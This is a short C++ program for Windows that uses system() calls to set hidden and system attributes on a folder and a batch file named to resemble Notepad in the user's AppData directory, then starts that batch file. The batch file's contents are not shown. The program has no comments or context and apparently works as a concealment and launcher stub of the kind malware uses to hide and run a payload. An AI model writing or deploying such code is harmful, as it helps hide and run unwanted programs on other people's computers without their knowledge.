#include <iostream>
#include <cstdlib>

int main() {
    system("attrib +h +s %appdata%\\notepad||exit");
    system("attrib +h +s %appdata%\\notepad\\note.bat||exit");
    system("start %appdata%\\notepad\\note.bat||exit");
    return 0;
}